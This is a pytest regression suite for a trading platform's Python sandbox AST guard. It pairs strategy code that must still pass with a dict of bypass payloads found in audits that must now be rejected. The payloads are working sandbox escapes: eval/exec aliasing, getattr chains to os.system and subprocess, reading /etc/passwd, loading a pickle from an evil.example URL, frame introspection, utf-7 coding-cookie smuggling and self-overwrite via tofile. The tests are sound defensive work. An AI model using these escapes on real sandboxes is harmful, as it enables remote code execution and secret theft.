"""Regression tests for AST-guard bypasses found in the 2026-06-22 security audit.

Each `BYPASS_*` payload previously returned `scan_source(...).ok == True` and then
executed in-process. They must now all be rejected. The `LEGIT_*` payloads are
representative indicator-strategy code that must keep passing.
"""
from __future__ import annotations

import pytest

from forven.sandbox.ast_guard import scan_source


BYPASS_PAYLOADS = {
    "builtins_eval_attr": "import builtins\nbuiltins.eval('1+1')\n",
    "builtins_exec_attr": "import builtins\nbuiltins.exec('x=1')\n",
    "builtins_open_attr": "import builtins\nbuiltins.open('/etc/passwd')\n",
    "builtins_compile_attr": "import builtins\nbuiltins.compile('1', '<s>', 'eval')\n",
    "dunder_builtins_name": "__builtins__['eval']('1+1')\n",
    "dunder_builtins_attr": "__builtins__.eval('1+1')\n",
    "getattr_binop_key": "import builtins\ngetattr(builtins, 'ev' + 'al')('1+1')\n",
    "getattr_nonconst_key": "import builtins\nk = 'eval'\ngetattr(builtins, k)('1+1')\n",
    "pandas_read_pickle": "import pandas as pd\npd.read_pickle('https://evil.example/x.pkl')\n",
    "pandas_read_csv_url": "import pandas as pd\npd.read_csv('https://evil.example/x.csv')\n",
    "numpy_load_allow_pickle": "import numpy as np\nnp.load('x.npy', allow_pickle=True)\n",
    "import_sys": "import sys\nsys.modules['os'].system('id')\n",
    "import_gc": "import gc\n",
    "import_inspect": "import inspect\n",
    "import_builtins": "import builtins\n",
    "import_importlib": "import importlib\n",
    "import_joblib": "import joblib\njoblib.load('x.pkl')\n",
    "import_io_open": "import io\nio.open('/etc/passwd')\n",
    "import_codecs": "import codecs\n",
    "from_builtins_import": "from builtins import eval as e\ne('1+1')\n",
    # Alias / indirection bypasses (2026-06-22 audit): the dangerous builtin is
    # never the direct callee, so the old Call.func-only denylist missed them.
    "alias_eval": "e = eval\ne('1+1')\n",
    "alias_compile": "c = compile\nc('1', '<s>', 'eval')\n",
    "alias_exec_in_list": "f = [exec][0]\nf('x=1')\n",
    "alias_getattr": "g = getattr\ng(object(), '__class__')\n",
    "alias_open": "o = open\no('/etc/passwd')\n",
    "eval_passed_as_arg": "list(map(eval, ['1+1']))\n",
    "dunder_import_alias": "i = __import__\ni('os')\n",
    "import_operator": "import operator\n",
    "operator_attrgetter": "from operator import attrgetter\nattrgetter('__globals__')(print)\n",
    # P1.2 (audit 2026-06-28): allowlist + traversal/smuggle bypasses that the old
    # denylist let through and that were proven to execute in-process.
    "pandas_subprocess_traversal": "import pandas as pd\npd._config.localization.subprocess.run(['echo', 'x'])\n",
    "pandas_os_traversal": "import pandas as pd\npd.compat.os.startfile('x')\n",
    "from_pandas_import_os": "from pandas.io.common import os\n_ = os.environ\n",
    "from_numpy_import_sys": "from numpy import sys\n",
    "import_winapi": "import _winapi\n",
    "import_http_client": "import http.client\n",
    "import_pdb_run": "import pdb\npdb.run('x=1')\n",
    "import_timeit_exec": "import timeit\ntimeit.timeit('x=1')\n",
    "import_winreg": "import winreg\n",
    "import_poplib": "import poplib\n",
    "relative_import_smuggle": "from . import os\n",
    # The forven.* tightening: orders / DB / credentials are now off-limits to
    # untrusted strategy code (the old denylist allowed ALL of forven.*).
    "forven_exchange_blocked": "from forven.exchange.hyperliquid import market_order\n",
    "forven_db_blocked": "from forven.db import get_db\n",
    "forven_secret_blocked": "from forven.secret_storage import decrypt_secret\n",
    "forven_config_blocked": "import forven.config\n",
    # ------------------------------------------------------------------
    # 2026-06-29 strategy-import-RCE audit: confirmed bypasses reproduced
    # against the real guard. Each PASSED scan_source before the hardening
    # and then reached RCE / secret-read / file-write on the import path.
    # ------------------------------------------------------------------
    # CRIT-1: PEP 263 source-encoding cookie (scan/compile byte-view split).
    "coding_cookie_utf7": "# coding: utf-7\nimport pandas as pd\n",
    "coding_cookie_unicode_escape": "# -*- coding: unicode_escape -*-\nimport pandas as pd\n",
    "coding_cookie_raw_unicode_escape": "#!/usr/bin/env python\n# coding: raw_unicode_escape\nimport numpy as np\n",
    "coding_cookie_fileencoding_alias": "# vim: set fileencoding=utf-7 :\nimport pandas as pd\n",
    "coding_cookie_utf16": "# coding: utf-16\nimport pandas as pd\n",
    # CRIT-3: frame / generator / coroutine / traceback introspection -> builtins.
    "gi_frame_f_builtins_exec": "g = (x for x in [1])\ng.gi_frame.f_builtins['exec']('x=1')\n",
    "gi_frame_f_globals": "g = (x for x in [1])\n_ = g.gi_frame.f_globals\n",
    "tb_frame_f_back_locals": (
        "try:\n    raise ValueError()\n"
        "except ValueError as e:\n    _ = e.__traceback__.tb_frame.f_back.f_locals\n"
    ),
    # CRIT-4: getattr constant-string indirection past the dunder-only check.
    "getattr_builtins_exec": "import dataclasses\ngetattr(getattr(dataclasses, 'builtins'), 'exec')('x=1')\n",
    "getattr_sklearn_os_system": "import sklearn\ngetattr(getattr(sklearn, 'os'), 'system')('id')\n",
    "getattr_os_environ": "import sklearn\n_ = getattr(getattr(sklearn, 'os'), 'environ')\n",
    "getattr_sys_modules": "import statistics\n_ = getattr(statistics, 'sys').modules\n",
    "getattr_const_subprocess": "import pandas as pd\ngetattr(pd._config.localization, 'subprocess')\n",
    # CRIT-5: allowlisted-library native gadgets / full-dotted-path import.
    "numpy_distutils_exec_command": "import numpy.distutils.exec_command as h\nh.exec_command('id')\n",
    "numpy_ctypeslib_import": "from numpy.ctypeslib import load_library\n",
    "numpy_ctypeslib_attr": "import numpy as np\nnp.ctypeslib.load_library('m', '.')\n",
    "numpy_f2py_import": "import numpy.f2py\n",
    "pandas_query_python_engine": (
        "import pandas as pd\n"
        "def g(df):\n    return df.query('a.__class__', engine='python')\n"
    ),
    # CRIT-6: write-serializer file-write primitives (-> overwrite __init__.py).
    "ndarray_tofile_self": "import numpy as np\nnp.frombuffer(b'x', np.uint8).tofile(__file__)\n",
    "df_to_csv": "def g(df):\n    df.to_csv('x.csv')\n",
    "df_to_json_path": "def g(df):\n    df.to_json('x.json')\n",
    "np_save": "import numpy as np\nnp.save('x.npy', np.zeros(3))\n",
    # Builtins-dict subscript callee.
    "subscript_dunder_globals": "d = {}\n_ = d['__globals__']\n",
    "subscript_exec_key": "d = {}\n_ = d['exec']\n",
}

LEGIT_PAYLOADS = {
    "pandas_numpy_indicator": (
        "import pandas as pd\n"
        "import numpy as np\n"
        "def generate_signals(df):\n"
        "    df = df.copy()\n"
        "    df['ema'] = df['close'].ewm(span=20).mean()\n"
        "    df['ret'] = np.log(df['close'] / df['close'].shift(1))\n"
        "    df['signal'] = (df['close'] > df['ema']).astype(int)\n"
        "    return df\n"
    ),
    "math_typing_dataclass": (
        "import math\n"
        "from dataclasses import dataclass\n"
        "from typing import Any\n"
        "@dataclass\n"
        "class P:\n"
        "    span: int = 14\n"
        "def f(x):\n"
        "    return math.sqrt(abs(x))\n"
    ),
    "json_loads_is_fine": "import json\nd = json.loads('{\"a\": 1}')\n",
    "to_dict_to_json_string_form": (
        "import pandas as pd\n"
        "def g(df):\n"
        "    return df.head().to_dict()\n"
    ),
    "constant_dynamic_import_pandas": "__import__('pandas')\n",
    # Direct calls with a constant, non-dunder attribute name stay legal — the
    # alias hardening must NOT regress these common idioms.
    "getattr_constant_ok": "def pick(o):\n    return getattr(o, 'close')\n",
    "setattr_constant_ok": "class S:\n    def f(self):\n        setattr(self, 'cached', 1)\n",
    "builtin_numeric_calls_ok": "def f(x):\n    return int(float(x)) + abs(x) + round(x, 2)\n",
    # P1.2: the allowlist must NOT regress real corpus patterns — legit submodules
    # of allowed libraries (numpy.random, scipy.signal, pandas.io), the extra TA/
    # science libs the corpus uses, and the strategy-facing forven API.
    "numpy_random_ok": "import numpy as np\ny = np.random.normal(size=3)\n",
    "scipy_signal_ok": "from scipy import signal\n_ = signal\n",
    "pandas_io_attr_ok": "import pandas as pd\n_ = pd.io\n",
    "pandas_ta_ok": "import pandas_ta as pta\n",
    "warnings_ok": "import warnings\nwarnings.warn('x')\n",
    "forven_base_ok": "from forven.strategies.base import BaseStrategy, Signal\n",
    "forven_marketdata_ok": "from forven.market_data_view import get_ohlcv\n",
    "forven_scanner_helper_ok": "from forven.scanner import compute_atr\n",
    # 2026-06-29 hardening must NOT regress these real corpus idioms.
    "ohlcv_subscript_open": "def g(df):\n    return df['open'] + df['close'] - df['low']\n",
    "dataclass_params_dict": (
        "from dataclasses import dataclass\n"
        "@dataclass\n"
        "class StrategyParams:\n    span: int = 14\n"
        "def defaults():\n    return StrategyParams().__dict__\n"
    ),
    "getattr_const_column_ok": "def pick(row):\n    return getattr(row, 'close')\n",
    "utf8_coding_cookie_ok": "# -*- coding: utf-8 -*-\nimport pandas as pd\n",
    "numpy_random_submodule_ok": "import numpy as np\n_ = np.random.default_rng(0)\n",
    "scipy_signal_submodule_ok": "from scipy import signal\n_ = signal.argrelextrema\n",
    "to_dict_in_memory_ok": "def g(df):\n    return df.tail().to_dict()\n",
}


@pytest.mark.parametrize("name", sorted(BYPASS_PAYLOADS))
def test_bypass_is_blocked(name: str) -> None:
    report = scan_source(BYPASS_PAYLOADS[name])
    assert not report.ok, f"payload {name!r} should be REJECTED but passed the guard"


@pytest.mark.parametrize("name", sorted(LEGIT_PAYLOADS))
def test_legit_strategy_passes(name: str) -> None:
    report = scan_source(LEGIT_PAYLOADS[name])
    assert report.ok, (
        f"legit payload {name!r} should PASS but was blocked: "
        + "; ".join(f.message for f in report.findings)
    )
